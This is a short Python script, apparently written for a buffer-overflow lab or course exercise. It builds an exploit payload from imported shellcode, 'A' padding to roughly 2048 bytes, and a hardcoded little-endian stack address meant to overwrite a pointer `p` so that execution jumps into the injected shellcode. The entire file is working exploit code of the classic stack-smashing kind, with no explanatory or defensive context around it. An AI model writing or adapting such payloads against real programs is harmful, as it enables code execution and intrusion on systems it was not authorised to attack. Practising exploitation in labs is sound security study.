#!/usr/bin/env python3

import sys

from shellcode import shellcode

# sys.stdout.buffer.write(shellcode)

# Address of `buf` in little-endian format
buf_address = (0x7ffffff6cbc0).to_bytes(8, 'little')  # Confirmed starting address of buf

# Padding length to reach `p` (approx 2048 bytes from buf to p)
padding_length = 2048

# Construct the payload: shellcode + padding + address of buf to overwrite p
payload = shellcode + b'A' * (padding_length - len(shellcode)) + buf_address

# Output the payload
sys.stdout.buffer.write(payload)